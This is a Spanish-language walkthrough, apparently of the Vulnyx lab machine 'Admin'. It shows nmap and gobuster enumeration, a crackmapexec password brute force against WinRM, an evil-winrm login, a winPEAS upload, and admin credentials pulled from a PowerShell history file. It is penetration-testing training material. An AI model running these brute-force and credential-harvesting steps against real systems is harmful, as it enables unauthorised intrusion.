# Admin

Plataforma: Vulnyx
OS: Windows
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 12 de abril de 2025 17:36
IP: 192.168.0.99

## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

Identidicamos el equipo medante un escaneo con arp-scan. Observamos que empieza por 08:00 , que corresponde al fabricante Virtual.

Mediante el TTL determinamos que se trata de una maquina Windonws

```bash
 whichSystem.py 192.168.0.99                                                                                                     
	192.168.0.99 (ttl -> 128): Windows
```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.99 -oG targeted

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5040/tcp  open  unknown      syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
47001/tcp open  winrm        syn-ack ttl 128
49664/tcp open  unknown      syn-ack ttl 128
49665/tcp open  unknown      syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
49667/tcp open  unknown      syn-ack ttl 128
49668/tcp open  unknown      syn-ack ttl 128
49670/tcp open  unknown      syn-ack ttl 128
49676/tcp open  unknown      syn-ack ttl 128
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
sudo nmap -p80,135,139,445,5040,5985,47001,49664,49665,49666,49667,49668,49670,49676 -sCV 192.168.0.99 -oN ports

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:A8:48:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-04-12T15:47:31
|_  start_date: N/A
|_nbstat: NetBIOS name: ADMIN, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:a8:48:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

- **Identificación de vulnerabilidades**
    - 80/tcp    open  http          Microsoft IIS httpd 10.0
    - 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    - 135/tcp   open  msrpc         Microsoft Windows RPC
    - 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    - 445/tcp   open  microsoft-ds?

Mediante fuzzing, buscamos directorios o ficheros disponibles en el servidor web

```bash
gobuster dir -u http://192.168.0.99 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt 
/tasks.txt            (Status: 200) [Size: 98]

```

Encontramos el fichero tasks.txt

```bash
Pending tasks:

 - Finish website
 - Update OS
 - Drink coffee
 - Rest
 - Change password

By hope
```

Al tener el puerto Winrm abierto, probamos a buscar el password para este usuario

Hay un posible usuario, por lo que procedemos a buscar la contraseña mediante crackmapexec

```bash
crackmapexec winrm 192.168.0.99 -u "hope" -p /usr/share/wordlists/rockyou.txt

WINRM       192.168.0.99   5985   ADMIN            [+] ADMIN\hope:loser (Pwn3d!)
```

Enumeramos recursos con 

```bash
smbmap -u "hope" -p "loser" -H 192.168.0.99
[+] IP: 192.168.0.99:445	Name: ADMIN               	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	IPC$                                              	READ ONLY	IPC remota
```

Listamos los recursos pero no vemos nada interesante.

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Winrm

Probamos la conexion mediante evil-winrm

```bash
evil-winrm -i 192.168.0.99 -u hope -p loser 
*Evil-WinRM* PS C:\Users\hope\desktop> dir

    Directorio: C:\Users\hope\desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/3/2024   9:42 PM             70 user.txt

*Evil-WinRM* PS C:\Users\hope\desktop> type user.txt
aa*************************ce1
*Evil-WinRM* PS C:\Users\hope\desktop> 

```

### Explotación posterior

<aside>
💡 Accedemos con las credenciales encontradas

</aside>

### Escalada de privilegios

Ejecutamos winPEAS para enumerar el sistema:

```bash

*Evil-WinRM* PS C:\> mkdir temp
*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> upload winPEASx64.exe
*Evil-WinRM* PS C:\temp>.\winPEASx64.exe

# Vemos en el historial el archivo de la cache de powershell, donde aparecen los últimos comandos ejecutados

  Found Windows Files
File: C:\Users\hope\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
File: C:\Users\hope\Documents\file\sam
File: C:\Users\All Users\USOShared\Logs\System
File: C:\Program Files\Common Files\System
File: C:\Program Files (x86)\Common Files\System
File: C:\Users\Default\NTUSER.DAT
File: C:\Users\hope\NTUSER.DAT

*Evil-WinRM* PS C:\temp> type  C:\Users\hope\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

*Evil-WinRM* PS C:\temp> type C:\Users\hope\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Set-LocalUser -Name "administrator" -Password (ConvertTo-SecureString "SuperAdministrator123" -AsPlainText -Force)

evil-winrm -i 192.168.0.99 -u administrator -p SuperAdministrator123
*Evil-WinRM* PS C:\Users\administrator\desktop> dir

    Directorio: C:\Users\administrator\desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/3/2024   9:43 PM             70 root.txt

*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
fe*************************b81
```

##